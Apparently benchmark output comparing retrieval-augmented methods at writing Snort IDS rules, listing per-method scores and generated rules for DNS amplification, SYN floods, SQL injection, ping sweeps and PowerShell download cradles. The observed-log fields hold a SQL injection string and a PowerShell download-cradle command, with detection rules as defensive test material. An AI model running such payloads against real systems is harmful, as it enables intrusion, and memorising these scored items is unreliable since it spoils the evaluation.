Q_028,baseline,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.3157894736842105,1.0,SNORT_0065,,Brute_Force,DNS_Attack,SSH Brute Force,DNS Amplification,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_028,rag_classic,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0133;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,rag_rerank,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0133;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,rag_hybrid,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0132;SNORT_0081,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,multi_hop,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0150;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,graph_rag,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0048;SNORT_0082;SNORT_0014;SNORT_0133,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,agentic_rag,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0132;SNORT_0081,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_029,baseline,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0139,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_029,rag_classic,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0122;SNORT_0018,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,rag_rerank,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0122;SNORT_0088;SNORT_0079;SNORT_0069,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,multi_hop,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0122;SNORT_0071;SNORT_0105,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,graph_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0139,SNORT_0069;SNORT_0139;SNORT_0037;SNORT_0122;SNORT_0088,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible TCP SYN scan against SSH""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000069; rev:1;)"
Q_029,agentic_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_030,baseline,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0005,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,rag_classic,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0090,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,rag_rerank,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,rag_hybrid,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,multi_hop,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,graph_rag,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,agentic_rag,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_031,baseline,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0036,,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_031,rag_classic,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0036,SNORT_0036;SNORT_0104;SNORT_0121;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000036; rev:1;)"
Q_031,rag_rerank,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0104;SNORT_0121;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_031,rag_hybrid,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_031,multi_hop,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0036,SNORT_0036;SNORT_0070;SNORT_0053;SNORT_0104;SNORT_0121,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000036; rev:1;)"
Q_031,graph_rag,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0053;SNORT_0070,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_031,agentic_rag,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_032,baseline,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0029,,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,rag_classic,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0012;SNORT_0148,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,rag_rerank,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0012;SNORT_0148,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,rag_hybrid,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0012;SNORT_0148,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,multi_hop,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0012;SNORT_0148,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,graph_rag,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0063;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
Q_032,agentic_rag,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0029,SNORT_0080;SNORT_0029;SNORT_0046;SNORT_0012;SNORT_0148,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
